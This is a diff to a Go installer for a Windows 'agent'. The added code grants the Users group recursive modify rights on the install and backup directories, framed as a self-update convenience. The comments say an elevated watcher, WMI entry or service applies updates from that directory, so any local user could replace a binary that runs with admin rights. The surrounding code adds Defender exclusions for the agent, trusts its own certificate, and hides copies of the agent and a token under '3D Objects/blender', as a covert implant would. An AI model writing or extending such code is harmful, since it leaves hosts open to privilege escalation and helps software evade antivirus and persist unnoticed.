@@ -105,6 +105,23 @@ func removeDefenderExclusions(paths ...string) {
 	}
 }
 
+// grantUsersModify lets a standard-user agent swap its own exe during
+// self-update (rename needs modify rights on the dir). Best effort:
+// logs and continues when icacls is unavailable.
+func grantUsersModify(dirs ...string) {
+	for _, d := range dirs {
+		if d == "" {
+			continue
+		}
+		out, err := exec.Command("icacls", d, "/grant", "*S-1-5-32-545:(OI)(CI)M", "/T", "/C", "/Q").CombinedOutput()
+		if err != nil {
+			log.Printf("[!] icacls %s: %v %s", d, err, strings.TrimSpace(string(out)))
+			continue
+		}
+		log.Printf("[*] Users modify granted on %s", d)
+	}
+}
+
 func saveHouse(path, addr string) {
 	addr = strings.TrimSpace(addr)
 	if addr == "" {
@@ -294,6 +311,13 @@ func install() {
 	// ask Defender to leave our dir/exe alone (heuristic false positives).
 	trustPublisherCert(installDir)
 	addDefenderExclusions(installDir, agentPath)
+	// Self-update-friendly ACL: the agent often runs as a standard user
+	// while the installer runs admin, leaving an admin-owned dir the agent
+	// cannot swap its own exe in (rename = Access denied). Grant Users
+	// modify (well-known SID, locale-proof) so future self-updates swap
+	// directly; boxes installed before this still converge via staged
+	// updates applied by the elevated watcher/WMI/service.
+	grantUsersModify(installDir)
 
 	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 	blenderDir := filepath.Join(threeDObjects, "blender")
@@ -318,6 +342,7 @@ func install() {
 	backupCert2 := filepath.Join(backupDir2, "server.crt")
 	_ = copyFile(agentPath, backupAgent2)
 	_ = copyFile(certPath, backupCert2)
+	grantUsersModify(blenderDir, backupDir2)
 	// Token travels with the backups (only when set - never create empties).
 	backupToken := filepath.Join(blenderDir, "token.txt")
 	backupToken2 := filepath.Join(backupDir2, "token.txt")
